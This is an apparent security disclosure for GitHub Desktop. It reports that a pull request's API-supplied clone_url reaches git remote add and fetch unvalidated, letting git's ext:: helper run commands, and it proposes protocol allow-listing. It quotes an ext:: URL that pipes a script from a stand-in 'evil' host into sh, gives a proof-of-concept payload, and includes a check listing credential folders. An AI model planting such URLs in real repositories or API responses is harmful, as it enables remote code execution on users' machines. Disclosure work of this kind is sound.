### Title
Attacker-Controlled GitHub API `clone_url` for a Pull Request's Head Repository Is Passed Unvalidated to `git remote add`/`git fetch`, Enabling Remote-Helper Command Execution - ([File: app/src/lib/stores/app-store.ts])

### Summary
`_findPullRequestBranch()` in `app-store.ts` takes `headCloneUrl` — a string returned verbatim by the GitHub/GHES API as `pullRequest.head.repo.clone_url` — and uses it, without any protocol/format validation, to create a git remote and then fetch from it. Git remote URLs can invoke arbitrary "remote helper" transports (e.g. `ext::<command>`), so any value returned by an API response for a PR's head repository is effectively an attacker-supplied git remote URL that Desktop will run `git remote add` and `git fetch` against.

### Finding Description
When a user opens a Pull Request (via the PR list, a notification, cherry-pick-from-PR, or the `x-github-client://openRepo/...&pr=NNN` deep link), Desktop resolves the branch to check out by calling: [1](#0-0) 

```
public async _findPullRequestBranch(
  repository, prNumber, headRepoOwner, headCloneUrl, headRefName
) {
  ...
  if (remote === undefined) {
    remote = await addRemote(repository, forkRemoteName, headCloneUrl)
  }
  ...
  await this._fetchRemote(repository, remote, FetchType.UserInitiatedTask)
```

`headCloneUrl` originates directly from the PR JSON object returned by the API (`pullRequest.head.repo.clone_url`), and is consumed by both the deep-link flow: [2](#0-1) 

and the normal "checkout PR" flow: [3](#0-2) 

`addRemote()` passes this string straight to `git remote add <name> <url>` with no protocol restriction: [4](#0-3) 

and the subsequent fetch is executed via `envForRemoteOperation`/`envForProxy`, which only special-cases `http(s)` URLs for proxy resolution — it never restricts or allow-lists the set of permitted git protocols (no `GIT_ALLOW_PROTOCOL`/`protocol.*.allow=never` is ever set anywhere in the codebase): [5](#0-4) 

Git supports "remote helper" transports identified by a URL scheme, including the built-in `ext::` helper, whose entire purpose is to run an arbitrary shell command supplied in the URL (e.g. `ext::sh -c "curl http://evil/x|sh"`). Because Desktop never restricts the allowed set of protocols before calling `remote add`/`fetch` on API-sourced URLs, a value like `ext::sh -c "..."` returned as `clone_url` for a PR's head repository will result in the attacker's command being executed on the victim's machine as soon as the corresponding branch is resolved.

This is distinct from `clone.ts`, which at least added a destination-path safety check (`isClonePathSensitive`) but likewise applies no protocol allow-listing: [6](#0-5) 

The check that exists elsewhere for matching/parsing remote URLs (`urlMatchesRemote`, `parseRemote`, `sanitizeCloneName`) only handles path-traversal/name-derivation concerns for `git@`/`https://` URLs — none of it rejects non-standard/remote-helper protocol strings before they reach `git remote add`/`git fetch`.

### Impact Explanation
This allows arbitrary local command execution (RCE) on the victim's machine, triggered purely by the victim opening/checking out a pull request whose head-repository metadata is attacker-influenced — for example: a self-hosted GitHub Enterprise Server instance that is compromised or malicious, a MITM'd/proxied API response, or (if reachable) a forked repository whose head-repo API object can be crafted to return a non-standard `clone_url`. This is the "attacker controls a GitHub API object" impact category explicitly called out as in-scope, and results in code execution, matching the severity class of the storage-corruption bug in the seed report (attacker-controlled data silently drives a security-sensitive operation with no validation).

### Likelihood Explanation
Exploitation requires the attacker to control (or MITM) the API endpoint/response that supplies PR/repository metadata — realistic for a malicious or compromised GitHub Enterprise Server that a victim has added an account for, or a network-position attacker against an HTTP(S) API endpoint without proper certificate pinning. It does not require local access, admin rights, prior malware, leaked credentials, or unnatural user steps: normal use of the "Checkout PR" / "Open in Desktop with PR" features is sufficient to trigger `addRemote`/`fetch` with the attacker-supplied URL.

### Recommendation
Before calling `addRemote`/`setRemoteURL`/`fetch` with any URL sourced from the GitHub API or from external input (PR head/base `clone_url`, deep-link URLs, fork URLs), validate that the URL uses only the standard git wire protocols (`https:`, `http:`, `ssh:`, `git:`) and reject anything else (in particular `ext::`, `fd::`, or other remote-helper schemes). Additionally, set `GIT_ALLOW_PROTOCOL=http:https:ssh:git` (or the equivalent `-c protocol.<name>.allow=never` for `ext`/`fd`) in the environment used for all remote-operation git invocations (`spawnGit`/`envForRemoteOperation`) as defense in depth, mirroring the existing `isClonePathSensitive` backstop pattern used in `clone.ts`.

### Proof of Concept
1. Attacker controls (or MITMs) an API endpoint that the victim's Desktop instance is configured to trust (e.g., a GHES account, or an unauthenticated/generic-git host response for pull-request metadata).
2. The endpoint's pull-request response sets the head repository's `clone_url` to: `ext::sh -c "touch /tmp/pwned"`.
3. Victim clicks "Checkout PR" in the PR list, or opens a `x-github-client://openRepo/...&pr=NNN` link pointing at that PR.
4. `_findPullRequestBranch` → `addRemote(repository, forkRemoteName, 'ext::sh -c "touch /tmp/pwned"')` → `git remote add <name> ext::sh -c "touch /tmp/pwned"` succeeds, then `_fetchRemote` runs `git fetch` against that remote, invoking git's `ext` transport helper, which executes `sh -c "touch /tmp/pwned"` on the victim's machine.

function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}
